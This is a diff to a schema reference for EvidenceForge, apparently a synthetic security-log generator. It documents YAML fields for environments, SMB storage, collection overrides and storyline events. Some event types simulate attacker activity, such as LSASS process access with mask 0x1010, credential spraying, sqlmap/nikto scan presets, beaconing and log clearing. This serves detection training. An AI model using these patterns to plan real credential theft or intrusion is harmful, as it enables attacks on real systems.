@@ -6,14 +6,40 @@ description: "Scenario Schema Reference"
 
 This document describes the EvidenceForge scenario file schema, including Phase 2.4 enhanced fields.
 
+This is the consolidated human manual. Installed authoring skills use smaller topic references
+under `commands/eforge/references/` so they can load the complete schema and semantics relevant to
+one change without loading this entire document. `eforge info` reports installation- and
+project-dependent inventories. Use `eforge schema <selector> --json` for an exact focused
+installed-version contract and executable minimal example.
+
+## Contents
+
+- [Overview](#overview), [top-level structure](#top-level-structure), and [includes](#includes)
+- [Seed and workload](#deterministic-seed-and-workload-envelope)
+- [Environment](#environment), including identity, systems, SMB, proxy, email, and sensors
+- [Personas](#personas), [time window](#time-window), and [baseline activity](#baseline-activity)
+- [Observation profile](#observation-profile)
+- [Storyline and typed events](#storyline)
+- [Output](#output) and [backward compatibility](#backward-compatibility)
+
 ## Overview
 
 Scenario files are YAML documents that define the environment, users, systems, personas, and storyline for log generation. All fields marked "Phase 2.4+" are optional and backward compatible with Phase 1 scenarios.
+
+Scenario 1.0 remains fully supported and is the compatibility format shown throughout this field
+reference. Scenario 2.0 uses `scenario_version: "2.0"` and may remain monolithic or explicitly
+select exact industry packs or one organization pack through `composition`. Packs are optional;
+no-pack scenarios do not scan for packs or warn about their absence. Pack exports use qualified
+`<pack-name>:<local-name>` references. Use `eforge pack list --json`, `eforge pack show`, and
+`eforge resolve --explain-composition --json` to inspect composition. See
+[Scenario 2.0 and composable packs](https://github.com/Cisco-Talos/EvidenceForge/blob/main/docs/reference/SCENARIO_PACKS.md)
+for repositories, fixed catalogs, precedence, CLI workflows, and authoritative artifacts.
 
 ## Top-Level Structure
 
 ```yaml
 version: "1.0"
+generation_seed: 42          # Optional uint64 (default: 42); controls deterministic substreams
 name: scenario-name          # Alphanumeric, dash, underscore
 description: |
   Multi-line scenario description
@@ -67,6 +93,10 @@ EvidenceForge reports a validation-time input error that names the conflicting
 field and source files. Lists such as `storyline`, `users`, and `systems` are
 owned as whole fields and are not automatically concatenated.
 
+Duplicate mapping keys within any YAML file are rejected before composition. A scenario must
+express one unambiguous value for each field; duplicate keys are never treated as last-value-wins
+overrides.
+
 Nested includes are allowed and are resolved relative to the file that declares
 them:
 
@@ -82,6 +112,21 @@ environment:
 
 The singular `include` key is accepted as a convenience for one file, but
 `includes` is the preferred form for new scenarios.
+
+Scenario composition is bounded to 32 levels, 256 files, 16 MiB of source YAML, and 1,000,000
+expanded nodes. These parsing and path-safety limits are always enforced independently of the
+generation resource forecast.
+
+Resource-forecast model v5 adds a `registry_report` to JSON validation output. It reports
+lifecycle, application-channel, local-artifact, collection-deployment, and deployment/content
+state separately: scenario drivers, created/live/retained/leased/stale/high-water counts,
+bounded-state plateau horizon, measured memory and operation costs, lookup-candidate bounds,
+amplification, and compaction work budget. Registry memory excludes interpreter, emitter,
+rendered-payload, attachment, sort, and storage-catalog working state; those bytes are named
+explicitly in the report. Peak memory combines the established whole-generator calibration and
+the measured registry floor with a maximum, never by adding the two overlapping estimates. Older
+callers that supply a pre-v5 calibration continue to receive the established forecast with
+`registry_report: null`.
 
 For larger exercise families, keep reusable organization context separate from
 scenario-specific narrative files:
@@ -112,6 +157,42 @@ scenario's local `includes/` directory and include the local copy instead of the
 shared one. Do not include both copies of the same section, because duplicate
 fields are validation errors rather than overrides.
 
+## Deterministic Seed and Workload Envelope
+
+`generation_seed` is a public unsigned 64-bit integer. Identical scenario content, seed, selected
+formats, and generator version reproduce the same deterministic substreams. The CLI can override
+the scenario value for one run:
+
+```bash
+uv run eforge generate scenario.yaml --seed 8675309 -o output
+```
+
+The effective seed is recorded in `COLLECTION_PROFILE.json`. Use explicit seed matrices instead
+of changing the scenario name or unrelated content to obtain independent deterministic runs.
+
+Before validation or generation allocates the workload, EvidenceForge estimates the primary
+duration, warm-up, periodic and explicit occurrences, canonical fan-out, rendered records, and
+attachment/email expansion. It combines that scenario estimate with currently available RAM,
+free swap, container memory constraints, and free space on the destination filesystem.
+
+Both `eforge validate` and `eforge generate` always print projected peak-memory, final-output, and
+peak-working-disk ranges. Peak working disk includes bounded Zeek external-sort runs that coexist
+temporarily with the final output. SMB estimates account for compiled catalog metadata, retained
+mutations, authored activity/session overhead, batch operation count, and source-specific rendered
+evidence; logical SMB file sizes are not counted because V1 does not materialize file payloads.
+When expected use reaches a material fraction of usable capacity, the forecast is followed
+immediately by a low, medium, or high resource warning. Resource warnings are
+advisory: generation continues without an override flag. YAML ambiguity, include budgets, path
+containment, regular-file, symlink, and archive safety checks remain hard errors because they are
+input-integrity boundaries rather than capacity forecasts.
+
+The forecast identifies its versioned calibration model in the output. Coefficients are measured
+and source-aware—for example, retained Sysmon event state is modeled differently from bounded
+streaming emitters, while output-byte rates account for source eligibility by operating system or
+host role. Calibration model v3 adds measured canonical SMB costs and separately measures final
+logical bytes and peak allocated working bytes. The calibration can be refined with additional
+measured runs without changing the CLI contract.
+
 ## Environment
 
 ```yaml
@@ -134,6 +215,8 @@ environment:
       reason: "CRM system decommissioned"
   groups: [...]               # Optional
   identity: ...               # Optional: logical-user to platform-account overrides
+  deployment_overrides: [...] # Scenario 2.0: exact-host deployment patches
+  observation_overrides: [...] # Scenario 2.0: exact-source-instance collection patches
 ```
 
 Stale accounts generate multiple types of background evidence: failed network logons (~15%/hour), Kerberos pre-auth failures (4771, status 0x12) on DCs (~5%/hour), scheduled task failures (batch logon type 4, ~3%/hour), and service startup failures (type 5, first hour only). Remote Windows failed-auth attempts use data-driven auth realism profiles for 4625 field shape, DC-side 4771/4776 validation-path selection, and matching established/reset-after-payload network evidence when sensors can see the traffic. Each field:
@@ -143,7 +226,8 @@ Stale accounts generate multiple types of background evidence: failed network lo
 
 ### Timezone Configuration
 
-All internal timestamps are stored in UTC. The timezone configuration controls output formatting.
+Generated evidence timestamps are emitted in UTC. The timezone configuration controls local
+business-hour and activity scheduling plus evaluator context; it does not localize emitted logs.
 
 - **default**: Applied to all systems unless overridden (default: `"UTC"`)
 - **systems**: Pattern-based overrides using fnmatch glob syntax (`*`, `?`, `[seq]`)
@@ -176,6 +260,8 @@ environment:
   identity:
     windows_default_scope: auto      # auto | domain | local
     linux_default_scope: directory   # directory | local
+    windows_account_control:         # Explicit user/machine/service account state
+      legacy.asrep: [DONT_REQUIRE_PREAUTH]
     users:
       aisha.johnson:
         windows:
@@ -194,6 +280,11 @@ placement are intentionally separate: a directory-backed Linux account can exist
 across Linux hosts, while local interactive activity is still placed by the world
 model using assigned users, primary systems, host roles, and plausible admin
 behavior.
+
+`windows_account_control` accepts modeled user, machine (for example `WS-01$`),
+or service principals. `DONT_REQUIRE_PREAUTH` is intentionally explicit: only an
+account carrying that flag may receive a successful Kerberos 4768 with
+`PreAuthType=0`; all ordinary accounts require pre-authentication by default.
 
 ### Users
 
@@ -217,17 +308,19 @@ systems:
   - hostname: WS-01            # Required: RFC 1123 compliant
     ip: "10.0.1.10"            # Required: IPv4 or IPv6
     os: "Windows 10"           # Required
+    os_build: "10.0.19045.4651" # Optional exact OS build identity
+    architecture: x64          # Optional: x86 | x64 | arm64
     type: workstation          # Required: workstation|server|domain_controller
     assigned_user: jsmith      # Optional: reference to username
     services: ["IIS"]          # Optional
-    roles: [web_server]        # Optional: forward_proxy, web_server, dns_server, mail_server
+    roles: [web_server]        # Optional: forward_proxy, web_server, dns_server, dhcp_server, mail_server
 ```
 
-`os` also accepts Linux (e.g. `"Ubuntu 22.04"`, `"CentOS 8"`) and macOS
-(e.g. `"macOS 14.4"`) strings — OS category detection is pattern-based
-(`windows`/`linux`/`macos`/`darwin`/`osx` substrings), not an enum. A macOS
-system produces `eslogger` (Endpoint Security) NDJSON instead of
-Windows Event/Sysmon or Linux syslog/bash history:
+`os` also accepts Linux (e.g. `"Ubuntu 22.04"`) and macOS (e.g. `"macOS 14.4"`) strings; OS
+category detection is pattern-based (`windows`/`linux`/`macos`/`darwin`/`osx` substrings), not an
+enum. A macOS system produces `eslogger` (Endpoint Security) NDJSON instead of Windows Event/Sysmon
+or Linux syslog/bash history. macOS Remote Login is off by default, so a Mac accepts inbound SSH
+only when it lists an `ssh` service (or is a server).
 
 ```yaml
 systems:
@@ -236,9 +329,89 @@ systems:
     os: "macOS 14.4"
     type: workstation
     assigned_user: dana.reyes
+    services: ["ssh"]          # Optional: enables inbound SSH (Remote Login)
 ```
 
 `roles` and `services` materially affect realism. They feed the compiled world model that drives infrastructure discovery, proxy routing, legitimate lateral-movement patterns, and whether remote access should look like SSH, RDP, or generic network activity.
+
+`os_build` and `architecture` are optional identity facts. When supplied, deployment and content
+compilation can distinguish releases and OS-native metadata without parsing a free-form `os`
+label. Omitting both preserves the existing deterministic OS inference. `architecture` describes
+the host and therefore does not accept the content-only `neutral` architecture.
+
+### Exact Deployment and Observation Overrides (Scenario 2.0)
+
+Scenario 2.0 can apply partial patches to one exact host deployment or one exact collection source.
+These fields are lists so each entry names its target explicitly; patterns, prefixes, role-wide
+selectors, and output-order identities are not accepted.
+
+```yaml
+scenario_version: "2.0"
+environment:
+  # users and systems omitted from this excerpt
+  deployment_overrides:
+    - system: WS-01
+      applications: [chrome, outlook]
+      services: []                    # Explicitly replace inherited services with none
+      tasks: [Office Automatic Updates 2.0]
+      modules: ["C:\\Windows\\System32\\kernel32.dll"]
+      cohorts: [finance-workstations]
+      user_applications:
+        - user: jsmith
+          applications: [chrome, outlook]
+
+  observation_overrides:
+    - source_instance: sysmon:ws-01
+      system: WS-01                   # Optional identity guard, not a selector
+      family: sysmon                  # Optional identity guard, not a family-wide selector
+      enabled: true
+      capabilities: [process, file, registry, coherent_actor]
+      missingness: 0.005
+      format_missingness:
+        windows_event_sysmon: 0.01
+      optional_fields: [CommandLine, Hashes]
+      windows:                        # UTC-aware, half-open [start, end) intervals
+        - start: "2026-08-16T12:00:00Z"
+          end: "2026-08-16T20:00:00Z"
+      batching:
+        enabled: true
+        interval_us: 5000000
+        max_records: 500
+```
+
+Override precedence, from lowest to highest, is built-in defaults, the selected named profile,
+project or organization-pack configuration, then the scenario entry. Composition merges entries by
+case-insensitive exact `system` or `source_instance`. Omitted patch fields inherit the lower layer.
+An explicit empty list is a replacement: for example, `services: []` removes inherited services,
+`capabilities: []` exposes no collection capabilities, and `windows: []` gives the source no active
+collection interval. Do not use `null` when an inherited value is intended; omit the field.
+
+Deployment patches change compiled population facts, not activity intensity. `applications`,
+`services`, `tasks`, and `cohorts` are exact configured identities. `user_applications` replaces
+eligibility for exact scenario users; effective access remains the intersection of installed
+applications and user/persona eligibility. Binary and module identities continue to derive from
+the selected application release and cannot be repaired independently in an override.
+
+Observation patches only control whether and how an already-canonical occurrence can be projected.
+They cannot create activity or change users, PIDs, ports, hashes, UIDs, content, or session
+relationships. `source_instance` is globally exact and case-insensitive. Stable compiler-created
+IDs use `<family>:<system-id>` for one source per host/family and append a stable local name when a
+host has multiple instances. The optional `system` and `family` fields are validation guards for
+that exact instance. Unknown source instances are rejected when the immutable source deployment is
+compiled.
+
+When exact source overrides are active, `OBSERVATION_MANIFEST.json` may include a
+`source_deployment_digest` that binds collection diagnostics to the immutable compiled source
+deployment. The bundle retains aggregate outcomes rather than every ephemeral projection envelope.
+
+Capability names cover event families (`process`, `authentication`, `session`, `network`, `dns`,
+`tls`, `http`, `file`, `registry`, `service`, `task`, `account`, `smb`, `ssh`, `rdp`, `ids`),
+endpoint direction (`source_endpoint`, `destination_endpoint`), actor enrichment
+(`coherent_actor`), analyzers (`dns_analyzer`, `tls_analyzer`, `http_analyzer`, `file_analyzer`,
+`smb_analyzer`), and structural features (`optional_fields`, `collection_windows`, `batching`).
+Enabled batching requires a positive `interval_us`; `max_records: 0` retains the unbounded batch
+count policy while the time interval remains authoritative. Collection windows are normalized to
+UTC, sorted, and must not overlap.
 
 ### Network Identities
 
@@ -262,6 +435,134 @@ synthetic fallback with a validation warning. IP-only activity remains IP-only
 unless the event also supplies a hostname or identity. Conflicting identity
 definitions are validation errors; event-level host/IP mismatches against a
 declared identity are warnings.
+
+### SMB Storage
+
+`environment.storage` compiles SMB2/3 disk-share topology for modeled Windows and Linux servers
+once. Omit it for deterministic file-server portfolios plus Windows DC SYSVOL/NETLOGON defaults.
+Population controls the bounded, duration-independent metadata catalog; activity independently
+controls baseline frequency. A configured Linux storage server uses Samba semantics. Give Linux
+clients that should participate in baseline file activity an SMB client service marker such as
+`cifs-utils`, `cifs-client`, or `smbclient`; Linux hosts do not gain baseline client capability from
+OS identity alone. An authored `smb_activity` explicitly supplies its client intent. GVFS profiles
+are background process/transport texture only and do not own typed file semantics.
+
+```yaml
+storage:
+  population: auto
+  activity: normal
+  file_sets:
+    - id: analyst-documents
+      system: WS-01
+      root: 'C:\Users\analyst'
+      preset: homes
+      population: small
+      seed_files:
+        - {ref: quarterly-plan, path: 'Documents\Quarterly Plan.docx', size_bytes: 284672}
+  servers:
+    - system: FS-01
+      presets: [collaboration, homes]
+      audit: standard
+      default_volume: data
+      volumes:
+        - {id: data, mount: 'D:\', filesystem: ntfs, label: SharedData}
+      shares:
+        - id: finance
+          name: Finance
+          volume: data
+          root: Departments\Finance
+          preset: department
+          access:
+            read: [Finance-Readers]
+            modify: [Finance-Users]
+            admin: [Domain Admins]
+          seed_files:
+            - {ref: forecast, path: 'Reports\FY26\forecast.xlsx', size_bytes: 1843200}
+    - system: FS-LNX-01
+      presets: [collaboration]
+      audit: high
+      default_volume: shared
+      volumes:
+        - {id: shared, mount: /srv/samba/shared, filesystem: ext4, label: SharedData}
+      shares:
+        - id: engineering
+          name: Engineering
+          volume: shared
+          root: Projects
+          preset: collaboration
+          smb_native_filesystem: NTFS
+          access:
+            read: [Engineering-Readers, svc_engineering]
+            modify: [Engineering-Users]
+  mappings:
+    - id: finance-f
+      share: FS-01.finance
+      audience: {groups: [Finance-Users], systems: [WS-01]}
+      drive: 'F:'
+      credential_mode: per_user
+      lifecycle: persistent
+    - id: engineering-linux
+      share: FS-LNX-01.engineering
+      audience: {groups: [Engineering-Users], systems: [DEV-LNX-01]}
+      mount: /mnt/engineering
+      credential_mode: fixed
+      principal: svc_engineering  # Samba requires a declared directory user/service account
+      lifecycle: persistent
+```
+
+File sets require a unique `id`, modeled Windows or Linux `system`, platform-native absolute
+`root`, one exact built-in or pack-qualified storage preset, optional population, and optional
+seed files. They compile persistent bounded local file/content identities without granting an SMB
+listener, server role, or network exposure. Presets provide a realistic population; seed files add
+exact story-relevant paths and references.
+
+Shares use stable `<system>.<share-id>` references; seed references are scoped to a share.
+Windows volumes use drive-root or absolute folder mounts with `ntfs` or `refs`; Linux volumes use
+absolute POSIX mounts with `ext4` or `xfs`. Supplied volumes are authoritative, explicit shares are
+additive, and generated shares are changed only through `share_overrides`. Share roots, seed paths,
+and selectors remain canonical SMB-relative paths with `\` separators on either server platform;
+the compiler derives the Windows or POSIX server-local path when it renders endpoint evidence.
+
+`filesystem` is the server's backing filesystem. `smb_native_filesystem` is the safe, optional
+wire-advertised label and is deliberately separate: Samba defaults to advertising `NTFS` even when
+the backing volume is ext4 or XFS, following Samba's version-sensitive
+[`fstype` contract](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html). The label is
+at most 64 characters and cannot contain control characters or path separators. Access is
+effective access: deny wins, admin implies modify/read, and modify implies read.
+
+Mappings may carry a Windows `drive`, a Linux `mount`, both for a mixed audience, or neither for
+platform-aware allocation. Explicit drives may use `D:` through `Z:`; `A:` and `B:` are reserved
+and `C:` remains the local system drive. Automatic Windows allocation uses `H:` through `Z:`;
+automatic Linux allocation uses `/mnt/<mapping-id>`. `credential_mode: per_user` is the default and
+uses the activity's resolved SMB principal. `credential_mode: fixed` requires `principal`; a
+per-user mapping forbids it. A fixed mapping principal is a credential identity, not proof that the
+initiating process runs as that account.
+For V1 domain-member Samba shares, the resolved credential must be a declared directory user or
+service account; guest, standalone, and host-local built-in identities are rejected. Windows SMB
+retains its existing platform-specific built-in-account rules.
+
+Server `audit` is `minimal`, `standard`, or `high`. It selects eligible source-native evidence,
+not network visibility: on Samba, minimal retains authentication and connection lifecycle,
+standard adds selected VFS operations and failures, and high adds modeled full-audit operations.
+Zeek still depends on a sensor that can observe the SMB transport. Use
+`eforge validate SCENARIO --show-storage` to inspect compiled volumes (including unused
+volumes), server platform, backing and advertised filesystems, share roots and scales, effective
+access, OS-native mappings, credential metadata, and up to three metadata-only catalog samples per
+share.
+
+An explicit share may set `backing_file_set` when that file set belongs to the same system and its
+root exactly equals the compiled server-local share root. The file set then owns the preset,
+population, and seed files; the share cannot redeclare them. Local and share views alias the same
+canonical objects, and the manifest/forecast count them once. A file set alone never exposes SMB.
+
+Generated `STORAGE_MANIFEST.json` uses `schema_version: 3`. It records unique host file sets,
+optional share bindings, volume platform, and backing filesystem. Each share records `provider`,
+`platform`, `network_root`, `server_native_root`,
+`backing_filesystem`, `advertised_filesystem`, `case_policy: case_insensitive`, and `audit_profile`.
+Each mapping retains `drive`/`mount` compatibility fields and adds an explicit `presentations` list
+of platform, type, and root, plus credential mode and non-secret principal identity. Resolved
+storyline path views remain separate. The manifest contains non-secret identities and topology,
+never credential secrets or file payloads.
 
 ### Proxy Deployment
 
@@ -288,7 +589,10 @@ Machine/service-account proxy usernames are not emitted routinely; set
 `non_human_principals: true` with low `machine_account_probability` or
 `service_account_probability` only for environments that intentionally
 authenticate non-human proxy clients. `mode: legacy` preserves the older
-machine-context User-Agent behavior for compatibility datasets.
+machine-context User-Agent behavior for compatibility datasets and emits an actionable deprecation
+warning because it will be removed in a future release. Migrate to `mode: realistic`; when the
+environment intentionally authenticates non-human clients, opt in and author those probabilities
+explicitly rather than relying on legacy behavior.
 
 ### Email Topology
 
@@ -378,10 +682,16 @@ The `roles` field declares a system's function in the network. The engine uses r
 - `web_server` — outbound: database queries, LDAP auth, API calls; inbound: HTTPS/HTTP from external clients and internal users. Human inbound traffic is generated as browsing sessions: top-level page views consume the `web` traffic-rate budget, and required assets/API calls fan out from each page load with shared HTTP transaction-depth and file-analysis semantics where applicable.
 - `database` — outbound: replication, updates; inbound: SQL queries from web/app servers
 - `mail_server` — outbound: SMTP relay, LDAP lookups; inbound: SMTP from internet, webmail from users
-- `file_server` — outbound: Kerberos/LDAP auth; inbound: SMB file access from workstations. File-server roles also increase baseline SMB target selection beyond normal DC SYSVOL/GPO traffic.
+- `file_server` — inbound file-service intent. On Windows this selects the native SMB server
+  provider. On Linux the role alone does not invent Samba: add `samba`, `smbd`, or `smb_server`, or
+  configure the host explicitly under `environment.storage.servers`. Eligible file servers increase
+  baseline SMB target selection beyond normal Windows DC SYSVOL/GPO traffic. Linux clients need an
+  explicit `cifs-utils`, `cifs-client`, or `smbclient` marker to join canonical baseline selection;
+  Kerberos/LDAP companions depend on the selected authentication path.
 - `domain_controller` — outbound: inter-DC replication; inbound: Kerberos/LDAP/DNS from all hosts
 - `forward_proxy` — routes outbound HTTP/HTTPS traffic through this system; generates proxy access logs with CONNECT entries for HTTPS and full destination URLs
 - `dns_server` — DNS resolution target
+- `dhcp_server` — DHCP acquisition/renewal target; pair with a concrete service such as `windows-dhcp-server` or `dhcpd`
 
 Inbound traffic is constrained by network topology: DMZ hosts receive substantial external traffic, while internal servers only receive connections from other internal systems. The firewall policy determines what gets permitted vs denied — denied connection attempts still produce firewall deny records and source-side sensor visibility.
 
@@ -465,6 +775,10 @@ Validation warns when a network topology has no firewall entry. Requesting `cisc
         workstations: inside
         servers: inside
         dmz: dmz
+      interface_security_levels: # Optional; conventional outside/dmz/inside use 0/50/100
+        outside: 0
+        dmz: 50
+        inside: 100
       default_action: deny      # deny (default) | permit
       deny_ratio: 5.0           # Deny events per allow event in baseline (default: 5.0)
       threat_detection_rate: 10 # Deny rate (drops/sec) triggering 733100 alerts (0=disabled)
@@ -546,7 +860,7 @@ The engine manages user sessions with exact transport-type matching. When a stor
 Multi-phase remote activities use action-bundle semantics internally. For example,
 an SSH request is modeled as one SSH session action that coordinates transport,
 auth, session, process, bash-history, endpoint/EDR, and teardown evidence before
-the engine dispatches individual canonical `SecurityEvent`s. An RDP request is
+the engine dispatches individual `CanonicalOccurrence` snapshots. An RDP request is
 modeled as one remote interactive session action that coordinates source-side
 `mstsc.exe`, TCP/3389 transport, target Type 10 logon/session metadata, and
 source-visible ordering before dispatch. Windows remote-admin events such as
@@ -608,7 +922,7 @@ Work hours are automatically parsed into a `work_hours_parsed` dict containing:
 
 ### Browsing Intensity
 
-The `browsing_intensity` field controls how much HTTP traffic a persona generates per browsing session. It affects proxy log depth (number of page loads and subresource cascades) for baseline web activity. Inbound `web_server` background traffic uses the separate `web_session_profiles.yaml` visitor mix: `traffic_rates.web` counts top-level visitor actions, then page assets and same-origin API calls fan out automatically. Plaintext HTTP browser sessions can produce multiple Zeek `http.log` rows on one connection UID with increasing `trans_depth`; large download-scale responses attach matching `files.log` metadata.
+The `browsing_intensity` field controls how much HTTP traffic a persona generates per browsing session. It affects proxy log depth (number of page loads and subresource cascades) for baseline web activity. Inbound `web_server` background traffic uses the separate `web_session_profiles.yaml` visitor mix: `traffic_rates.web` counts top-level visitor actions, then page assets and same-origin API calls fan out automatically. Plaintext HTTP browser sessions can produce multiple Zeek `http.log` rows on one connection UID with increasing `trans_depth`; every transmitted nonempty response entity attaches matching responder-direction `files.log` metadata.
 
 ```yaml
 personas:
@@ -729,14 +1043,20 @@ baseline_activity:
               POST:
                 statuses: {"200": 0.90, "400": 0.06, "401": 0.04}
                 request_body_bytes: [100, 3000]
+                request_content_type: application/json
+                # Optional multipart/content-disposition filename; not a host path.
+                request_wire_filename: comment.json
                 response_body_bytes: [200, 2000]
                 content_type: application/json
 ```
 
 Web request profiles are route-based: each route owns its valid methods, status
-distribution, body-size ranges, and content type. Do not model paths, methods,
-and status codes as independent random lists; that produces unrealistic
-combinations such as POST requests for static resources.
+distribution, body-size ranges, response `content_type`, and optional
+`request_content_type`/`request_wire_filename` metadata. A wire filename feeds
+Zeek's `orig_filenames` but is deliberately not treated as a local host path, so
+it does not invent endpoint file-read evidence. Do not model paths, methods, and
+status codes as independent random lists; that produces unrealistic combinations
+such as POST requests for static resources.
 
 For non-HTTP hunts, use `kind: connection` with `connection_profile` byte,
 duration, and `conn_state` ranges. Use `traffic_suppression` to down-rank or
@@ -760,6 +1080,12 @@ sources. `GROUND_TRUTH.md` records source evidence status for instructors, and
 Observation decisions are coherent inside source-local lifecycle groups, so a single source does
 not drop or delay process create/dependent/terminate rows, logon/logoff rows, or same-UID network
 companions independently in a way that would orphan its own evidence.
+
+Scenario 2.0 may refine the named profile for one concrete source through
+`environment.observation_overrides`; see
+[Exact Deployment and Observation Overrides](#exact-deployment-and-observation-overrides-scenario-20).
+The exact-source patch has higher precedence than the named profile and never applies to sibling
+sources implicitly.
 
 The same profile name also selects endpoint host-clock defaults from
 `config/activity/timing_profiles.yaml`. `complete` keeps endpoint clocks aligned
@@ -807,39 +1133,130 @@ minutes or hours. `explicit_offsets` accepts one offset per child event, such as
 
 | Type | Generates | Required Fields | Optional Fields |
 |------|-----------|-----------------|-----------------|
-| `process` | 4688, Sysmon 1, eCAR PROCESS, macOS eslogger fork/exec | `process_name` | `command_line`, `supplementary` (auto/none), `process_ref` (names this process for later `parent_ref`/`process_ref` use), `parent_ref` (earlier `process_ref` to use as the parent), `working_directory` (process cwd: Sysmon `CurrentDirectory`, eslogger `exec.cwd`; derived when omitted) |
-| `logon` | 4624, target-host 4672 for elevated sessions, eCAR LOGIN | | `logon_type` (default 3), `source_ip` |
-| `failed_logon` | 4625, eCAR LOGIN failure | | `source_ip`, `logon_type` (default 3) |
+| `process` | 4688, Sysmon 1, eCAR PROCESS, macOS eslogger fork/exec | `process_name` | `command_line`, `process_ref`, `parent_ref`, `supplementary` (auto/none), `working_directory` (process cwd: Sysmon `CurrentDirectory`, eslogger `exec.cwd`; derived when omitted) |
+| `file` | Sysmon 11/eCAR file events (create/modify/delete/read), macOS eslogger (create/open/write/rename/unlink); `create` under LaunchAgents/LaunchDaemons also drives the BTM causal rule | `path` | `action` (create/modify/delete/read/open/write/rename/unlink, default create), `pid` (explicit actor PID), `process_ref` (earlier `process_ref` of the process performing the file action; default is the most recent storyline process on that system) |
+| `logon` | 4624, target-host 4672 for elevated sessions, eCAR LOGIN; Type 9 uses the host's active/assigned desktop user as the local caller and the event actor as outbound credentials | | `logon_type` (default 3), `source_ip` (ignored for local Type 9) |
+| `failed_logon` | 4625, eCAR LOGIN failure | | `source_ip`, `logon_type` (default 3), `target_username` |
 | `logoff` | 4634, eCAR LOGOUT | | |
-| `file` | Sysmon 11/eCAR file events (create/modify/delete/read), macOS eslogger (create/open/write/rename/unlink); `create` under LaunchAgents/LaunchDaemons also drives the BTM causal rule | `path` | `action` (create/modify/delete/read/open/write/rename/unlink, default create), `pid` (explicit actor PID override; default resolves from the most recent storyline process on that system), `process_ref` (earlier `process_ref` of the process performing the file action) |
-| `connection` | Zeek conn, eCAR FLOW, + web_access/zeek_http when `service: http` | `dst_ip` | `dst_port` (default 443), `hostname` (domain for DNS/SSL SNI), `service`, `source_ip`, `method`, `uri`, `status_code`, `user_agent`, `orig_bytes`, `resp_bytes`, `conn_state`, `process_ref` (earlier `process_ref` of the owning process; for large uploads this keeps the named process as the uploader instead of substituting a browser/curl) |
-| `ssh_session` | canonical SSH connection (Zeek conn) + syslog sshd + EDR/eCAR | | `source_ip` |
-| `rdp_session` | Zeek conn + 4624 type 10 + eCAR | | `source_ip` |
+| `connection` | Zeek conn, eCAR FLOW, + web_access/zeek_http/files when `service: http` | `dst_ip` | `dst_port` (default 443), `hostname`, `service`, `source_ip`, `method`, `uri`, `status_code`, `user_agent`, `referrer`, `request_body_len`, `request_multipart`, `response_body_len`, `response_multipart`, `orig_bytes`, `resp_bytes`, `conn_state`, `ids_alerts`, `process_ref` (earlier `process_ref` of the owning process; for uploads this keeps the named process as the uploader) |
+| `smb_activity` | SMB transport/auth/session/tree/file lifecycle; Zeek SMB/files, platform-eligible Windows or Samba audit, eCAR | `operation` plus its share/client location shape | `purpose`, `batch`, `outcome`, `path_style`, `mapping`, `client_access`, `auth_protocol`, `smb_principal`, external `client`, `ids_alerts` |
+| `ssh_session` | canonical SSH connection (Zeek conn) + syslog sshd + EDR/eCAR | | `source_ip`, `ids_alerts` |
+| `rdp_session` | Zeek conn + 4624 type 10 + eCAR | | `source_ip`, `ids_alerts` |
 | `account_created` | 4720 (on DC) | `target_username` | `target_sid` |
 | `account_deleted` | 4726 (on DC) | `target_username` | `target_sid` |
 | `group_member_added` | 4728/4732/4756 (on DC) | `group_name`, `member_name` | `scope` (global/local/universal) |
-| `service_installed` | 4697, eCAR SERVICE/CREATE | `service_name`, `service_file_name` | `service_account` |
+| `service_installed` | 4697, eCAR SERVICE/CREATE | `service_name`, `service_file_name` | `service_account`, `source_ip` (modeled remote-administration source) |
 | `scheduled_task_created` | 4698 | `task_name` | `task_content` |
 | `log_cleared` | 1102 | | |
 | `create_remote_thread` | Sysmon 8, eCAR THREAD/REMOTE_CREATE | `target_process` | |
-| `dhcp_lease` | Zeek dhcp.log | | `mac_address`, `requested_ip` |
-| `port_scan` | ASA 106023 (bulk denies) | `target_ips` or `target_segment` | `source_ip`, `target_count`, `ports`, `protocol`, `scan_rate` |
-| `beacon` | Zeek conn/proxy/ASA (periodic connections) | `dst_ip`, `interval`, one of `end_time`/`duration`/`count` | `action` (allow/deny), `hostname`, `service`, `protocol`, `source_ip`, `method`, `uri`, `user_agent`, `referrer`, `status_code`, `orig_bytes`, `resp_bytes`, `profile`, `http_sequence`, `jitter` (default: 0.15) |
-| `dns_query` | Zeek dns.log + conn.log, Sysmon 22 | `query` | `qtype`, `rcode`, `ttl`, `answer` (required for NOERROR), `source_ip` |
+| `process_access` | Sysmon 10, eCAR PROCESS/OPEN | | `target_process` (default `lsass.exe`), `access_mask` (default `0x1010`) |
+| `dhcp_lease` | Zeek dhcp.log | | `mac_address`, `requested_ip`, `ids_alerts` |
+| `port_scan` | ASA 106023 (bulk denies) | `target_ips` or `target_segment` | `source_ip`, `target_count`, `ports`, `protocol`, `scan_rate`, `ids_alerts` |
+| `beacon` | Zeek conn/proxy/ASA/Snort (periodic connections) | `dst_ip`, `interval`, one of `end_time`/`duration`/`count` | `action` (allow/deny), `hostname`, `service`, `protocol`, `source_ip`, `method`, `uri`, `user_agent`, `referrer`, `status_code`, `orig_bytes`, `resp_bytes`, `profile`, `http_sequence`, `ids_alerts`, `jitter` (default: 0.15) |
+| `dns_query` | Zeek dns.log + conn.log, Sysmon 22 | `query` | `qtype`, `rcode`, `ttl`, `answer` (required for NOERROR), `source_ip`, `ids_alerts` |
 | `email_message` | SMTP route evidence: Zeek conn/dns/smtp/files, artifacts, ground truth | at least one of `to`/`cc`/`bcc` | `sender`, `subject`, `body`, `corpus_id`, `artifact_id`, `user_agent`, `verdict`, `mail_action`, `outcome`, `attachments` |
 | `email_read` | Opaque TLS mailbox access: DNS + conn/ssl/x509 evidence only | | `mailbox`, `server`, `protocol` (`imaps`/`owa`), `message_ids`, `count`, `duration`, `user_agent` |
-| `web_scan` | web_access + Zeek HTTP (bulk HTTP requests) | `dst_ip`, `rate`, one of `end_time`/`duration`/`count` | `preset` (nikto/dirb/gobuster/sqlmap/nmap_http), `paths`, `hostname`, `user_agent`, `jitter` (default: 0.4) |
+| `web_scan` | web_access + Zeek HTTP (bulk HTTP requests) | `dst_ip`, `rate`, one of `end_time`/`duration`/`count` | `preset` (nikto/dirb/gobuster/sqlmap/nmap_http), `paths`, `hostname`, `user_agent`, `ids_alerts`, `jitter` (default: 0.4) |
 | `credential_spray` | Windows 4625/4776 or syslog auth | `target_accounts`, `interval`, one of `end_time`/`duration`/`count` | `pattern` (spray/brute_force/stuffing), `source_ip`, `logon_type`, `success`, `jitter` (default: 0.5) |
